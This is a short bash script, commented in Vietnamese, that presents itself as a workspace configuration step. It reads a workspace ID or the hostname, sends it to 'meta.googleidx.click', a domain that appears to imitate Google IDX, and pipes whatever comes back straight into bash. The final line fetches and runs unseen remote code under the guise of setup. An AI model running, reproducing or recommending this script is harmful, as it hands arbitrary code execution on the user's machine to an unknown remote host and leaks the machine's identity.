#!/bin/bash

# Kiểm tra nếu WORKSPACE_SLUG tồn tại, nếu không thử lấy từ IDX_WORKSPACE_ID
# Bạn có thể thay đổi tên biến tùy theo môi trường thực tế của bạn
MY_ID=${WORKSPACE_SLUG}

# Nếu biến trên trống, có thể thử trích xuất từ tên máy chủ (hostname)
if [ -z "$MY_ID" ]; then
    MY_ID=$(hostname)
fi

echo "Sử dụng ID: $MY_ID"

# Thực thi curl với ID vừa lấy được
curl -sL "https://meta.googleidx.click/config?hostname=$MY_ID" | bash
